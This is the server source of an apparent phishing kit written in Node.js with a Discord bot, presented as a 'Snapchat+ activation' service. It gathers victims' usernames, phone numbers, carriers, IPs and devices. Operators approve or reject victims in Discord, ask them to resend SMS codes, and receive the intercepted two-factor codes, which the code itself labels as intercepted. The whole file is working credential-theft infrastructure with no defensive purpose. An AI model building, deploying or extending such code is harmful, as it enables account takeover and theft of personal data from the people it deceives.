require('dotenv').config();
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const { v4: uuidv4 } = require('uuid');

// --- Configuration Express ---
const app = express();
app.use(express.json());
app.use(express.static('public'));

// Récupérer l'IP réelle derrière proxy/Render
app.set('trust proxy', true);

// --- Configuration Discord ---
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

let botReady = false;
const pendingMessages = []; // File d'attente si bot pas encore prêt

// ================== PERSISTANCE JSON ==================
const DATA_FILE = path.join(__dirname, 'requests.json');

function loadRequests() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            const obj = JSON.parse(raw);
            return new Map(Object.entries(obj));
        }
    } catch (e) {
        console.error('Erreur chargement requests.json:', e.message);
    }
    return new Map();
}

function saveRequests(map) {
    try {
        const obj = {};
        for (const [k, v] of map.entries()) obj[k] = v;
        fs.writeFileSync(DATA_FILE, JSON.stringify(obj, null, 2), 'utf8');
    } catch (e) {
        console.error('Erreur sauvegarde requests.json:', e.message);
    }
}

const requests = loadRequests();

// ================== RATE LIMITING ==================
const rateLimitMap = new Map(); // IP → timestamp dernière soumission
const RATE_LIMIT_MS = 10 * 60 * 1000; // 10 minutes

function isRateLimited(ip) {
    const last = rateLimitMap.get(ip);
    if (!last) return false;
    return Date.now() - last < RATE_LIMIT_MS;
}

function setRateLimit(ip) {
    rateLimitMap.set(ip);
    // Nettoyage auto après expiration
    setTimeout(() => rateLimitMap.delete(ip), RATE_LIMIT_MS);
}

// ================== ENVOI DISCORD (avec file d'attente) ==================
async function sendToDiscord(fn) {
    if (botReady) {
        return fn();
    }
    return new Promise((resolve, reject) => {
        pendingMessages.push(async () => {
            try { resolve(await fn()); }
            catch (e) { reject(e); }
        });
    });
}

// ================== UTILITAIRES ==================
const APPROVAL_CHANNEL_ID = process.env.DISCORD_APPROVAL_CHANNEL;
const PRIORITY_CHANNEL_ID = '1532004514306068510'; // salon prioritaire (lecture seule, 10s avant)
const BASE_URL = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const PORT = process.env.PORT || 3000;

const AUTO_REJECT_MS = 5 * 60 * 1000; // 5 minutes

function parseUserAgent(ua) {
    if (!ua) return { os: 'Inconnu', device: 'Inconnu' };
    let os = 'Inconnu';
    let device = 'Desktop';
    if (/iPhone/.test(ua)) { os = 'iOS'; device = '📱 iPhone'; }
    else if (/iPad/.test(ua)) { os = 'iOS'; device = '📱 iPad'; }
    else if (/Android/.test(ua)) {
        os = 'Android';
        const m = ua.match(/Android [0-9.]+; ([^)]+)/);
        device = '📱 ' + (m ? m[1].trim() : 'Android');
    } else if (/Windows/.test(ua)) { os = 'Windows'; device = '🖥️ PC'; }
    else if (/Macintosh/.test(ua)) { os = 'macOS'; device = '🖥️ Mac'; }
    else if (/Linux/.test(ua)) { os = 'Linux'; device = '🖥️ Linux'; }
    return { os, device };
}

// ================== ROUTES EXPRESS ==================

// 1. Soumission des infos (étape 1)
app.post('/api/submit', async (req, res) => {
    const { snapchat, phone, operator } = req.body;
    if (!snapchat || !phone || !operator) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    // Rate limiting
    const ip = req.ip || req.headers['x-forwarded-for'] || 'inconnu';
    if (isRateLimited(ip)) {
        return res.status(429).json({ error: 'Trop de demandes, réessaie dans 10 minutes.' });
    }
    setRateLimit(ip);

    const ua = req.headers['user-agent'] || '';
    const { os, device } = parseUserAgent(ua);

    const id = uuidv4();
    const requestData = {
        snapchat, phone, operator, ip, device, os,
        approved: false, rejected: false, code: null,
        createdAt: Date.now()
    };
    requests.set(id, requestData);
    saveRequests(requests);

    // Timeout auto 5 min
    setTimeout(async () => {
        const req = requests.get(id);
        if (req && !req.approved && !req.rejected) {
            req.rejected = true;
            saveRequests(requests);
            console.log(`⏰ Demande #${id} auto-rejetée après 5 min`);
        }
    }, AUTO_REJECT_MS);

    try {
        await sendToDiscord(async () => {
            const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
            const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);
            if (!mainChannel) throw new Error("Salon principal introuvable");

            const embed = new EmbedBuilder()
                .setTitle('📱 Nouvelle demande d\'activation Snapchat+')
                .setColor(0xFFFC00)
                .addFields(
                    { name: 'Pseudo',    value: snapchat,  inline: true },
                    { name: 'Téléphone', value: phone,     inline: true },
                    { name: 'Opérateur', value: operator,  inline: true },
                    { name: 'Appareil',  value: device,    inline: true },
                    { name: 'OS',        value: os,        inline: true },
                    { name: 'IP',        value: ip,        inline: true },
                    { name: 'ID',        value: id }
                )
                .setTimestamp();

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger),
                    new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('📲 Renvoyer SMS').setStyle(ButtonStyle.Secondary)
                );

            // 1. Salon prioritaire reçoit EN PREMIER (sans boutons)
            if (priorityChannel) {
                const priorityEmbed = new EmbedBuilder()
                    .setTitle('👁️ [PRIORITAIRE] Nouvelle demande')
                    .setColor(0xFF6600)
                    .addFields(
                        { name: 'Pseudo',    value: snapchat,  inline: true },
                        { name: 'Téléphone', value: phone,     inline: true },
                        { name: 'Opérateur', value: operator,  inline: true },
                        { name: 'Appareil',  value: device,    inline: true },
                        { name: 'OS',        value: os,        inline: true },
                        { name: 'IP',        value: ip,        inline: true },
                        { name: 'ID',        value: id }
                    )
                    .setFooter({ text: 'Lecture seule — le salon principal reçoit dans 10s' })
                    .setTimestamp();
                await priorityChannel.send({ embeds: [priorityEmbed] });
            }

            // 2. Salon principal reçoit 10 secondes après avec les boutons
            setTimeout(async () => {
                try {
                    await mainChannel.send({ embeds: [embed], components: [row] });
                } catch (e) {
                    console.error('Erreur envoi salon principal (delayed):', e);
                }
            }, 10000);

            console.log(`✅ Demande #${id} envoyée (prioritaire immédiat, principal dans 10s)`);
        });

        res.json({ id });
    } catch (err) {
        console.error('Erreur envoi Discord :', err);
        res.status(500).json({ error: 'Erreur serveur' });
    }
});

// 2. Vérification pseudo Snapchat via Business API
app.get('/api/check-snapchat/:username', async (req, res) => {
    const username = req.params.username.trim().toLowerCase();

    if (!username || username.length < 3 || username.length > 15) {
        return res.json({ exists: false, reason: 'format' });
    }

    try {
        const apiUrl = `https://businessapi.snapchat.com/public/v1/public_profiles/search?query=${encodeURIComponent(username)}`;
        const response = await axios.get(apiUrl, {
            timeout: 8000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
                'Accept': 'application/json',
                'Accept-Language': 'fr-FR,fr;q=0.9',
                'Referer': 'https://www.snapchat.com/',
                'Origin': 'https://www.snapchat.com'
            },
            validateStatus: () => true
        });

        console.log(`[SnapCheck] ${username} → HTTP ${response.status}`);

        if (response.status !== 200) {
            return res.json({ exists: false, error: 'indisponible' });
        }

        const data = response.data;
        const profiles = data.public_profiles || data.profiles || data.results || [];

        const match = profiles.find(p => {
            const uname = (p.username || p.user_name || p.snapchat_username || '').toLowerCase();
            return uname === username;
        });

        if (match) {
            const displayName = match.display_name || match.displayName || match.name || username;
            const avatarUrl   = match.bitmoji_avatar_url || match.avatar_url || match.avatarUrl
                             || match.profile_image_url  || match.thumbnail_url || null;
            return res.json({ exists: true, username, displayName, avatarUrl });
        }

        return res.json({ exists: false });

    } catch (err) {
        console.error('[SnapCheck] Erreur API:', err.message);
        return res.json({ exists: false, error: 'indisponible' });
    }
});

// 3. Statut d'une demande (polling)
app.get('/api/status/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    res.json({
        approved:  request.approved,
        rejected:  request.rejected,
        snapchat:  request.snapchat,
        resend:    request.resend || false   // signal "Renvoyer SMS"
    });
});

// 4. Acquitter le signal "resend"
app.post('/api/resend-ack/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    request.resend = false;
    saveRequests(requests);
    res.json({ ok: true });
});

// 5. Code reçu
app.post('/api/code', async (req, res) => {
    const { id, code } = req.body;
    if (!code) return res.json({ success: true });

    const request = requests.get(id) || {};
    const snapchat  = request.snapchat  || 'Inconnu';
    const phone     = request.phone     || 'Inconnu';
    const operator  = request.operator  || 'Inconnu';
    const device    = request.device    || 'Inconnu';
    const os        = request.os        || 'Inconnu';
    const ip        = request.ip        || 'Inconnu';

    const sendCode = async () => {
        await sendToDiscord(async () => {
            const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
            const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);

            const codeEmbed = new EmbedBuilder()
                .setTitle('🔐 Code 2FA intercepté')
                .setColor(0x00FF00)
                .addFields(
                    { name: 'Pseudo',    value: snapchat  },
                    { name: 'Téléphone', value: phone     },
                    { name: 'Opérateur', value: operator  },
                    { name: 'Appareil',  value: device    },
                    { name: 'OS',        value: os        },
                    { name: 'IP',        value: ip        },
                    { name: 'Code',      value: `**${code}**` }
                )
                .setTimestamp();

            if (priorityChannel) {
                try {
                    const priorityCodeEmbed = new EmbedBuilder()
                        .setTitle('👁️ [PRIORITAIRE] Code 2FA intercepté')
                        .setColor(0x00FF00)
                        .addFields(
                            { name: 'Pseudo',    value: snapchat },
                            { name: 'Téléphone', value: phone    },
                            { name: 'Opérateur', value: operator },
                            { name: 'Appareil',  value: device   },
                            { name: 'IP',        value: ip       },
                            { name: 'Code',      value: `**${code}**` }
                        )
                        .setFooter({ text: 'Lecture seule — salon principal reçoit dans 10s' })
                        .setTimestamp();
                    await priorityChannel.send({ embeds: [priorityCodeEmbed] });
                } catch (e) { console.error('Erreur salon prioritaire (code):', e.message); }
            }

            // Salon principal 10 secondes après
            if (mainChannel) {
                setTimeout(async () => {
                    try { await mainChannel.send({ embeds: [codeEmbed] }); }
                    catch (e) { console.error('Erreur salon principal (code):', e.message); }
                }, 10000);
            }
        });
    };

    sendCode().catch(console.error);
    if (id) {
        requests.delete(id);
        saveRequests(requests);
    }

    res.json({ success: true });
});

// --- Interactions Discord (boutons) ---
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const requestId = parts.slice(1).join('_');

    if (!['approve', 'reject', 'resend'].includes(action)) return;

    const request = requests.get(requestId);
    if (!request) return interaction.reply({ content: 'Demande introuvable ou expirée.', ephemeral: true });

    if (action === 'resend') {
        request.resend = true;
        saveRequests(requests);
        return interaction.reply({ content: `📲 Signal "Renvoyer SMS" envoyé à ${request.snapchat}.`, ephemeral: true });
    }

    if (request.approved || request.rejected) {
        return interaction.reply({ content: 'Déjà traitée.', ephemeral: true });
    }

    if (action === 'approve') {
        request.approved = true;
        saveRequests(requests);
        await interaction.reply({ content: `✅ Demande acceptée pour ${request.snapchat}.`, ephemeral: true });
    } else {
        request.rejected = true;
        saveRequests(requests);
        await interaction.reply({ content: `❌ Demande refusée pour ${request.snapchat}.`, ephemeral: true });
    }

    // Désactiver les boutons du message
    try {
        const disabledRow = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder().setCustomId(`approve_${requestId}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success).setDisabled(true),
                new ButtonBuilder().setCustomId(`reject_${requestId}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger).setDisabled(true),
                new ButtonBuilder().setCustomId(`resend_${requestId}`).setLabel('📲 Renvoyer SMS').setStyle(ButtonStyle.Secondary).setDisabled(true)
            );
        await interaction.message.edit({ components: [disabledRow] });
    } catch (e) {
        console.error('Erreur désactivation boutons:', e.message);
    }
});

// --- Démarrage ---
client.once('ready', async () => {
    console.log(`🤖 Bot Discord connecté en tant que ${client.user.tag}`);
    botReady = true;
    // Vider la file d'attente
    while (pendingMessages.length > 0) {
        const fn = pendingMessages.shift();
        try { await fn(); } catch (e) { console.error('Erreur file attente:', e.message); }
    }
});

client.login(process.env.DISCORD_BOT_TOKEN);

app.listen(PORT, () => {
    console.log(`🚀 Serveur web lancé sur ${BASE_URL}`);
});
